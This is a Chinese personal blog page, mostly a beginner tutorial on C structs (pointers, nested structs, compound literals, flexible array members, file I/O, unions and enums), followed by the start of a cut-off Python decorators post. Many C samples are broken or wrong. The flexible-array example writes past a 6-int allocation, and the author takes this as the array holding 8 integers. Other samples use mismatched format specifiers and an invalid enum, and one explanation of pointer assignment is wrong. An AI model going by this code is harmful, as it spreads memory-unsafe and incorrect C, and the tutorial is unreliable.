<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">library</span>[20];</span></span><br><span class="line">library[<span class="number">2</span>].name=<span class="string">"高等数学"</span>;  <span class="comment">//代表library的第三个元素的那么成员</span></span><br></pre></td></tr></table></figure>
<p>此时，[2]是library的下标，应当注意区别：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">library[<span class="number">2</span>].name;</span><br><span class="line">library.name[<span class="number">2</span>];</span><br></pre></td></tr></table></figure></p>
<p>后者指的是library的第一个成员的name的第三个字符。  </p>
<hr>
<ul>
<li><strong>关于嵌套结构</strong>  </li>
</ul>
<p>有时候我们会在一个结构中嵌套另一个结构例如：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span>&#123;</span> </span><br><span class="line">  <span class="keyword">char</span> firstname[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">char</span> lastname[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>只需在外层结构中声明即可，同理，使用两次点运算符进行访问：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">person.dyf.name=<span class="string">"dyf"</span>;</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><strong>指向结构的指针</strong><br>我们可以通过指针来传递并访问结构，这种操作非常舒服。  </li>
<li>声明与初始化指针： </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> * <span class="title">p</span>;</span>    <span class="comment">//定义一个只想person结构类型的指针p</span></span><br><span class="line"></span><br><span class="line">p = &amp;dyf;    <span class="comment">//将dyf的地址赋值给指针p</span></span><br></pre></td></tr></table></figure>
<p>p指针在被定义后只能指向person的结构类型，储存person结构的地址。<br>与数组不同的是，结构的名并不代表首个成员的地址，因此必须使用&amp;操作符。  </p>
<ul>
<li><strong>指向结构的指针</strong>  </li>
</ul>
<p>我们可以通过指针来传递并访问结构，这种操作非常舒服。  </p>
<ul>
<li>声明与初始化指针： </li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line">     </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> * <span class="title">p</span>;</span>    <span class="comment">//定义一个指向person结构类型的指针p</span></span><br><span class="line">     </span><br><span class="line">p = &amp;dyf;    <span class="comment">//将dyf的地址赋值给指针p  </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> * <span class="title">m</span>;</span></span><br><span class="line">m = &amp;library[<span class="number">2</span>];    <span class="comment">//同理，结构数组内的结构如图赋值</span></span><br></pre></td></tr></table></figure>
<p>p指针在被定义后只能指向person的结构类型，储存person结构的地址。<br>与数组不同的是，结构的名并不代表首个成员的地址，因此必须使用&amp;操作符。  </p>
<ul>
<li><p>使用指针访问成员：<br>此时我们可以引入一个新的运算符”-&gt;”。例如：  </p>
   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">m-&gt;name == library[<span class="number">2</span>].name;</span><br><span class="line"></span><br><span class="line">m == &amp;library[<span class="number">2</span>];  <span class="comment">//m存的地址即为library[2]的地址</span></span><br><span class="line">     </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d"</span>,m-&gt;name);   <span class="comment">//打印library[2].name 即高等数学</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>m -&gt; value 此操作符意味着取m地址中存的结构的成员，即：  </p>
<pre><code><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">m -&gt; value.name == (*m).name == library[<span class="number">2</span>].name;</span><br></pre></td></tr></table></figure>

 注意：`&apos; * &apos;` 的运算级大于` &apos; . &apos;`　使用时注意加()  
</code></pre><hr>
<ul>
<li><strong>向函数传递结构</strong>  </li>
</ul>
<p>只要结构具有单个值的数据类型，即：int及其相关类型、char、float、double、指针等，就可以把它作为一个参数传递给函数，如：  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">name</span>&#123;</span></span><br><span class="line">  <span class="keyword">char</span> firstname[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">char</span> lastname[<span class="number">20</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">name</span> <span class="title">myname</span>;</span></span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">  <span class="keyword">int</span> height;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getInfo</span><span class="params">(struct person * p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outIbfo</span><span class="params">(struct person * p)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123; </span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">person</span> <span class="title">dyf</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">person</span> * <span class="title">p</span>;</span></span><br><span class="line">  p = &amp;dyf;</span><br><span class="line">  getInfo(p);</span><br><span class="line">  outInfo(p);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getInfo</span><span class="params">(struct person * p)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your firstname\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;((*p).myname.firstname));        <span class="comment">//注意理解这里</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your last name\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;((p-&gt;myname).lastname));         <span class="comment">//注意理解这里</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your age\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;(p-&gt;age));</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your height\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;(p-&gt;height));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">outInfo</span><span class="params">(struct person * p)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"\nname\t);</span></span><br><span class="line"><span class="string">  printf("</span>%s %s\n<span class="string">",(p-&gt;myname).firstname,(p-&gt;myname).lastname);</span></span><br><span class="line"><span class="string">  printf("</span>age   %d\n<span class="string">",p-&gt;age);</span></span><br><span class="line"><span class="string">  printf("</span>height    %d\n<span class="string">",p-&gt;height);</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>以上是利用指针来传递结构参数，应当深刻理解’-&gt;’的意义。  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;dyf;    <span class="comment">//这仅仅是获得dyf变量的名而不是其地址  等价于(*dyf)</span></span><br></pre></td></tr></table></figure>
<p>但<code>scanf()</code>需要传递给地址，因此我们需要使用&amp;操作符。如果你理解了以上两种寻址方式，那么你对-&gt;的理解算是合格了。但距离用结构和指针实现面向对象还有一定距离。顺便说一句，我们通常用结构和指针实现队列的数据结构，好好理解指针吧。  </p>
<p>当然除了以上这种用指针传递参数的方式，我们还可以直接用结构的名传递参数。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">yourmark</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> math;</span><br><span class="line">  <span class="keyword">int</span> English;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">mark</span><span class="params">(struct yourmark mark )</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> mark.math + mark.English;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这种传参方式很自然也很好理解，但是这毕竟只是赋值给形参，因此如果想改变元数据，我们依旧要使用指针。  </p>
<p>  如果要返回struct则：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">yourmark</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> math;</span><br><span class="line">  <span class="keyword">int</span> English;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function">struct yourmark <span class="title">getmark</span><span class="params">(struct yourmark mark)</span></span>&#123;      <span class="comment">// 此处的返回类型为yourmark结构类型</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"please enter your math mark and English mark\n"</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;(mark.math),&amp;(mark.English));</span><br><span class="line">  <span class="keyword">return</span> mark</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct yourmark mark;</span><br><span class="line">mark = getmark(mark);   <span class="comment">// 注意，给结构赋值时直接用其名而不是其地址</span></span><br></pre></td></tr></table></figure></p>
<p>  同理，要返回指针只需要<code>struct yourmark * mark getmark(struct yourmark mark)</code></p>
<p>好了到这里，把结构在函数里传来传去已经差不多说完了。  </p>
<hr>
<ul>
<li><strong>复合文字和结构</strong> </li>
</ul>
<p>C99引入了一些新的概念，比如变长数组(VLA)、复合文字(compound literal)、指针的兼容性等。  </p>
<p>  复合文字的意思：<br>  假如我要给函数传递参数，我可以传递一个变量也可以传递一个常量，例如：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">2</span>,b=<span class="number">3</span>;</span><br><span class="line">sum(a,b)==sum(<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure></p>
<p>  但是对于数组或者结构来讲我们之前没有说过常量这个概念，在传递参数时或者向另一结构传递时可能要定义新的变量，很浪费内存。此时，便引入了复合文字这一概念。<br>  声明如下：<br>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">20</span>];</span><br><span class="line">  <span class="keyword">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">person</span> <span class="title">guy</span>;</span>     <span class="comment">//定义一个person结构类型的结构</span></span><br><span class="line"></span><br><span class="line">guy = (struct person)&#123;<span class="string">"dyf"</span>,<span class="number">18</span>&#125;;   <span class="comment">//把复合文字赋值给guy  </span></span><br><span class="line"></span><br><span class="line">outInfo((struct person)&#123;<span class="string">"麂皮"</span>，<span class="number">18</span>&#125;)；  <span class="comment">//将一个匿名结构作为实参传递给函数  </span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">class23</span> &#123;</span></span><br><span class="line">  (struct person)&#123;<span class="string">"dyf"</span>,<span class="number">18</span>&#125;;</span><br><span class="line">  (struct person)&#123;<span class="string">"麂皮"</span>，<span class="number">18</span>&#125;;</span><br><span class="line">&#125;;                                    <span class="comment">//将两个匿名结构传递给class23</span></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------  </span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mark</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> math;</span><br><span class="line">  <span class="keyword">int</span> English;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mark</span><span class="params">(struct mark * p)</span></span>;       <span class="comment">//声明一个参数为mark结构的指针的函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d"</span>,mark(&amp;(struct mark )&#123;<span class="number">150</span>，<span class="number">150</span>&#125;))；   <span class="comment">//传递复合文字的地址</span></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mark</span><span class="params">(struct mark * p)</span></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> p-&gt;math + p-&gt;English；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 注：用G++编译会报错，因为其地址是temporary 而C99版本的GCC是可行的,因为临时具有自动储存时期，而在函数外具有静态储存时期 */</span></span><br></pre></td></tr></table></figure></p>
<p>这是复合文字的大概用法，他能够创建一个匿名常量对象，直接在结构体或者函数中传递的常量。  </p>
<hr>
<ul>
<li><strong>伸缩性数组成员</strong>  </li>
</ul>
<p>C99加入了一个成为伸缩性数组成员(flexible array member)的新特性,该特性允许结构的最后一个成员是一个具有特殊属性的数组结构，<br>该数组的属性之一就是他并不立即存在。创建规则如下：  </p>
<ol>
<li>伸缩性数组成员必须是最后一个成员  </li>
<li>结构中至少有一个其他成员  </li>
<li>像普通数组那样声明，只是长度不定，例：<code>int a[];</code>  </li>
</ol>
<p>如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mark</span>&#123;</span></span><br><span class="line">  <span class="keyword">int</span> average;</span><br><span class="line">  <span class="keyword">char</span> subjects[]   <span class="comment">//伸缩数组成员</span></span><br><span class="line">&#125;；</span><br></pre></td></tr></table></figure></p>
<p>此时subjects[]并未被创建，系统没有为他分配足够的内存空间。通常我们要使用伸缩数组时，都会为其先分配足够的内存空间。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mark</span> * <span class="title">p</span>;</span></span><br><span class="line">p=<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct mark) + <span class="number">20</span> * <span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br></pre></td></tr></table></figure>
<p>这时我们已经有足够的内存来存放一个mark型结构，并且他可以存放一个19个字符的字符串。没错，开辟的内存空间要能存放结构本身和所需大小的数组。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">flex</span>&#123;</span></span><br><span class="line">        <span class="keyword">int</span> age;</span><br><span class="line">        <span class="keyword">char</span> * name;</span><br><span class="line">        <span class="keyword">char</span> * favobook[<span class="number">20</span>];    <span class="comment">//思考一下，他在main()中能直接赋值吗</span></span><br><span class="line">        <span class="keyword">int</span> favonumber[];</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">flex</span> * <span class="title">p</span>;</span></span><br><span class="line">    p = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct flex)+<span class="number">6</span>* <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">    p-&gt;age=<span class="number">18</span>;</span><br><span class="line">    p-&gt;favonumber[<span class="number">7</span>]=<span class="number">1</span>;</span><br><span class="line">    p-&gt;name=<span class="string">"dyf"</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s \t %d \t %d"</span>,p-&gt;name,p-&gt;age,p-&gt;favonumber[<span class="number">7</span>]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里我们声明里一个指针name，要注意在C语言中，字符串以数组的形式存储，也就是说其变量名实际是个地址，在我们对其进行声明时计算机已经为他在内存中开辟了空间，所以其地址实际上是个常量，即name是个常量。假如我要进行<code>name=&quot;dyf&quot;;</code>操作，编译器将报错。<code>&quot;dyf&quot;</code>的地址很明显与<code>name</code>本身冲突，故不能直接赋值。<br>这里我们看到favonumber能存8个整数，我也不知道为什么，回去查查资料再来修改。</p>
<hr>
<ul>
<li><strong>将结构存到文件中</strong>  </li>
</ul>
<p>结构的整套信息我们称之为记录(record),单个的项目称之为字段(field)，下面，我们来进行讨论。<br>第一种方法，也是最笨拙的方法，使用<code>fprinf()</code>函数，例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> title[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">char</span> author[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">double</span> value;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">book</span> <span class="title">math</span>;</span></span><br><span class="line"><span class="built_in">fprintf</span>(books, <span class="string">"%9s %9s %7.2d"</span>,math.title,math.author,math.value);</span><br></pre></td></tr></table></figure>
<p>我们使用<code>%9s</code>来固定输入格式，以便于下一次读取,这里的books是文件流。</p>
<p>第二种方法，我们可以使用fread()和fwrite()以结构大小为单位来进行读写，例如：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(&amp;math,<span class="keyword">sizeof</span>(struct book),<span class="number">1</span>,books)</span><br></pre></td></tr></table></figure></p>
<p>这时我们将定位到math的地址<code>sizeof(struct book)</code>将返回一块book结构的大小，<code>&#39;1&#39;</code>则告诉函数只需复制一块结构，最后将整个record写入<code>books</code>相关联的文件。同样<code>fread()</code>将record写入<code>&amp;math</code>地址。  </p>
<hr>
<ul>
<li><strong>衍生出的其他数据类型</strong></li>
</ul>
<p>通过对结构体进行封装，C中还有联合又称为共用体(union)、枚举(enumerated type)两种类型。首先，union声明如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> id&#123;</span><br><span class="line">    <span class="keyword">char</span> id_string[<span class="number">20</span>];</span><br><span class="line">    <span class="keyword">int</span> id_int;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p>
<p>假如一个物体的id有可能是整数，也有可能是字符串，那么我们可以用以上操作。<br>union并不是复合结构,这其中的声明的类型只能同时存在一种，也就是说id可以是字符串类型，也可以是int类型。<br>因此，我们可以声明一个union数组来存放不同类型的数据，这样就实现了混合数据类型存储。这种数据类型封装的方法与结构相同，同样支持<code>. -&gt;</code>等运算符，但是其意义却完全不同。<br>其次，枚举类型声明如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">enum</span> subjects &#123;math=,English=<span class="number">2</span>,Chinese,CS&#125;;</span><br><span class="line"><span class="keyword">enum</span> subjects my_favo_subject;</span><br><span class="line"><span class="keyword">for</span>(my_favo_subject=math;my_favo_subject&lt;=CS;my_favo_subject++)&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,my_favo_subject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们通常用枚举创建符号常量，例如，<br><code>math，CS</code>是枚举常量，默认为int类型，math是枚举对象的首元素，其默认值为0，这就好比数组的下标，方便我们进行枚举。我们也可以给枚举常量一个指定值，例如上面<code>English=2</code>，那么，其后面的元素依次从2递增。由于枚举类型是一个整数类型，所以我们常将其用于表达式当中，方便进行逻辑判断或者运算。<br><strong>注：</strong><br>C语言支持枚举变量自增，即<code>my_favo_subject++;</code>但是C++不支持，注意代码兼容性。</p>
<hr>
<ul>
<li><strong>用结构实现链表</strong>  </li>
</ul>
<p>dyf is cool.</p>
<hr>
<ul>
<li><strong>用结构实现面向对象</strong>  </li>
</ul>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2018-12-02</span>
          
            
              <span class="post-category"><a href="/categories/python/">python</a></span>
            
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2018/12/02/对装饰器的理解/">对装饰器的理解</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <p>关于python装饰器的思考： </p>
<p>我们首先应该对函数进一步了解<br>函数也可以被传递，比如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">	print(<span class="string">"a"</span>)</span><br><span class="line">v = a</span><br><span class="line">v()</span><br><span class="line">输出结果为：a</span><br></pre></td></tr></table></figure></p>
<p>这里我并没有加()即v = a()，因为v()此时将返回TypeError，而print(v)则由于无返回值而返回None  </p>
<hr>
<p><strong>而v = a则将函数名作为参数传递，想要运行该函数只需要v()，此时print(v)将返回v的地址。</strong><br><strong>函数内也可以声明函数，但是此函数并不能在函数外访问，如：</strong>  </p>
<p>如：  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">v</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'00'</span>)</span><br><span class="line">	v()</span><br><span class="line">v()</span><br><span class="line">此时运行结果为：<span class="number">00</span></span><br><span class="line">							NameError: name <span class="string">'v'</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure>
<hr>
<ul>
<li><strong>进一步理解函</strong>  </li>
</ul>
<h3 id="函数也是可以被返回的"><a href="#函数也是可以被返回的" class="headerlink" title="函数也是可以被返回的"></a>函数也是可以被返回的</h3><p>如果要返回函数，只需返回其函数名即可，其函数名将作为参数传递。如需调用则只需函数名加括号，在这里尤其要弄清楚传递和返回函数时该不该加括号。</p>
<p>如：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">(x)</span>:</span></span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">b</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'dyf'</span>)</span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">()</span>:</span></span><br><span class="line">		print(<span class="string">'abc'</span>)</span><br><span class="line">	<span class="keyword">if</span> x == <span class="string">'1'</span>:</span><br><span class="line">		<span class="keyword">return</span> b</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">return</span> c</span><br><span class="line">x = input(<span class="string">'请输入'</span>)</span><br><span class="line">v = a(x)</span><br><span class="line">v()</span><br><span class="line">则输出结果为:</span><br><span class="line">	请输入 <span class="number">1</span></span><br><span class="line">	dyf</span><br><span class="line">	请输入 <span class="number">2</span></span><br><span class="line">	abc</span><br></pre></td></tr></table></figure></p>
